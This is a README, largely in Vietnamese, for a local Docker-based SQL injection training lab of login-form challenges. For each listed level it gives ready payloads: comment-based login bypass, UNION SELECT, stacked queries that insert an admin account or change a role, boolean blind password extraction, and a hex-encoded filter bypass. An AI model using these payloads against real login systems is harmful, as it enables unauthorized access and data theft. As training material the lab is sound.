# 🔒 SQL Injection Login Challenge Labs

## Tổng quan
Hệ thống này đã được chuyển đổi hoàn toàn thành **16 login form challenges** với mức độ khó tăng dần. Mỗi level là một form đăng nhập khác nhau với mục tiêu chung: **Đăng nhập với quyền admin bằng SQL injection**.

## 🎯 Mục tiêu chính
**Bypass authentication và login với role 'admin' trên mỗi level**

## 📋 Danh sách các Level

### **Level 1 - Basic Login** 🚨
- **Loại**: Error-based SQL injection  
- **Đặc điểm**: Hiển thị lỗi SQL, dễ nhất cho người mới
- **Mục tiêu**: Login admin với basic injection
- **Hint**: `admin'--` trong username field

### **Level 2 - Union Login** 🔗  
- **Loại**: UNION-based injection
- **Đặc điểm**: Trích xuất dữ liệu từ nhiều bảng
- **Mục tiêu**: Dùng UNION SELECT để login admin
- **Hint**: `' UNION SELECT 1,'admin','admin'--`

### **Level 3 - Stacked Query Login** ⚡
- **Loại**: Multiple SQL statements
- **Đặc điểm**: Cho phép thực thi nhiều lệnh SQL
- **Mục tiêu**: Tạo tài khoản admin mới hoặc modify existing
- **Hint**: `admin'; INSERT INTO users VALUES(99,'hacker','pass','admin');--`

### **Level 4 - Blind Login** 🔍
- **Loại**: Boolean-based blind injection
- **Đặc điểm**: Không hiển thị lỗi, chỉ có TRUE/FALSE response
- **Mục tiêu**: Trích xuất admin password qua blind techniques
- **Hint**: Test từng ký tự của password admin

### **Level 9 - Admin Portal** 🚪
- **Loại**: Professional multi-layer security
- **Đặc điểm**: 
  - Input sanitization (removable quotes)
  - Role-based access control
  - Multiple validation layers
  - Progressive hints system
- **Mục tiêu**: Bypass tất cả security layers
- **Hint**: Dùng hex encoding hoặc CHAR() function

## 🚀 Cách sử dụng

### 1. Khởi động Lab
```bash
cd "SQLi Lab"
docker-compose up -d
```

### 2. Truy cập Web Interface
- **URL**: http://localhost:8080
- **Database**: MySQL 8.0 
- **Tables**: users, levels, meta

### 3. Progression đề xuất
1. **Beginners**: Bắt đầu với Level 1, 2, 3
2. **Intermediate**: Level 4, 9 
3. **Advanced**: Các level còn lại (sẽ được tạo thêm)

## 🎲 Sample Attack Vectors

### Level 1 (Basic)
```sql
Username: admin'--
Password: anything
```

### Level 2 (Union)
```sql
Username: ' UNION SELECT 1,'admin','password','admin'--  
Password: password
```

### Level 3 (Stacked)
```sql
Username: test'; UPDATE users SET role='admin' WHERE username='test';--
Password: test
```

### Level 4 (Blind)
```sql
# Extract admin password character by character
Username: admin' AND ASCII(SUBSTR(password,1,1))>97--
# Then login with extracted password
```

### Level 9 (Advanced)
```sql
Username: admin UNION SELECT 1,0x61646d696e,0x70617373,0x61646d696e--
Password: anything
```

## 🏁 Success Criteria

Mỗi level thành công sẽ hiển thị:
- ✅ Thông báo thành công 
- 🏁 **FLAG** unique cho level đó
- 👤 Thông tin user admin đã login
- 🎯 Điều kiện: `role = 'admin'`

## 📊 Database Schema

```sql
users table:
- id (INT)
- username (VARCHAR)  
- password (VARCHAR)
- role (VARCHAR) -- 'admin', 'user', 'guest'
```

## 🛠️ Customization

Để thêm level mới:
1. Copy template từ level hiện có
2. Modify vulnerability type
3. Update index.php với level mới
4. Thêm unique flag cho level

## 🔧 Troubleshooting

**Lỗi database connection:**
```bash
docker-compose down
docker-compose up -d --build
```

**Reset database:**
```bash
docker-compose exec db mysql -u root -p sqli_lab < init.sql
```

## 🎯 Learning Outcomes

Sau khi hoàn thành tất cả challenges, bạn sẽ master:
- ✅ Error-based SQL injection
- ✅ UNION-based data extraction  
- ✅ Stacked queries manipulation
- ✅ Blind injection techniques
- ✅ Filter bypassing methods
- ✅ Authentication bypass strategies

---

**Happy Hacking! 🚀** 

*Nhớ chỉ sử dụng skills này cho mục đích học tập và ethical hacking!*